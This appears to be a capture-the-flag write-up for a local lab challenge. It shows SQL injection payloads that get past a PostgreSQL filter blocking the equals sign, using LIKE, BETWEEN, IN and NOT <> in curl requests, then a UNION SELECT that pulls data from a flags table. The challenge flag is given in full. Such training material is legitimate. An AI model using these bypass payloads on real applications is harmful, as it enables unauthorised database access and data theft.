# SQLi-052: PostgreSQL Equals Filter Bypass - Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** LIKE, BETWEEN, IN thay cho `=`  
**DBMS:** PostgreSQL  
**Flag:** `FLAG{3qu4ls_l1k3_b3tw33n_byp4ss}`

---

## 🔍 Bước 1: DETECT

```bash
# Test với equals
curl "http://localhost:5052/user?id=1 AND 1=1"
# → "Equals sign (=) is blocked!"
```

## 🎯 Bước 2: BYPASS

```bash
# LIKE thay cho =
curl "http://localhost:5052/user?id=1 AND 1 LIKE 1"
# → Bypass thành công!

# BETWEEN thay cho =
curl "http://localhost:5052/user?id=1 AND 1 BETWEEN 1 AND 1"

# IN thay cho =
curl "http://localhost:5052/user?id=1 AND 1 IN (1)"

# NOT <> thay cho =
curl "http://localhost:5052/user?id=1 AND NOT 1<>1"
```

## 🔢 Bước 3: ENUMERATE & EXFILTRATE

```bash
# UNION với LIKE comparison
curl "http://localhost:5052/user?id=0 UNION SELECT 1,name,value FROM flags WHERE name LIKE '%'"
```

🎉 **FLAG:** `FLAG{3qu4ls_l1k3_b3tw33n_byp4ss}`

---

## 🔧 Alternative Techniques

```sql
-- Regex matching (PostgreSQL)
WHERE username ~ '^admin$'

-- Substring comparison
WHERE SUBSTRING(username,1,5) LIKE 'admin'

-- Boolean with greater/less than
WHERE id > 0 AND id < 2  -- = id=1
```

## ✅ Flag

```
FLAG{3qu4ls_l1k3_b3tw33n_byp4ss}
```
